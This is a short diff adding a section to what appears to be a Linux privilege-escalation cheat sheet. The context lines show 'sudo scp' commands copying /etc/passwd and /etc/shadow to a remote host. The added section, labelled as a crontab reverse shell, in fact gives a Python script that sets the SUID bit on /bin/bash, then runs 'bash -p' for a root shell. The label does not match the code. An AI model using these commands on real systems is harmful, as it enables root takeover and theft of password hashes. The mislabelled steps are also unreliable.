@@ -239,3 +239,17 @@ ALL=(root) NOPASSWD: /usr/bin/awk
   sudo scp /etc/passwd mayank@192.168.1.105:~/
   sudo scp /etc/shadow mayank@192.168.1.105:~/
   ``````````
+
+# 14. /etc/crontab
+  make reverse shell in crontab python file
+ `````````
+ /var/.file.py
+ 
+ #!/usr/bin/python3
+
+import  os
+os.system("chmod +s /bin/bash")
+
+/bin/bash -p
+````````````````````````````
+ 
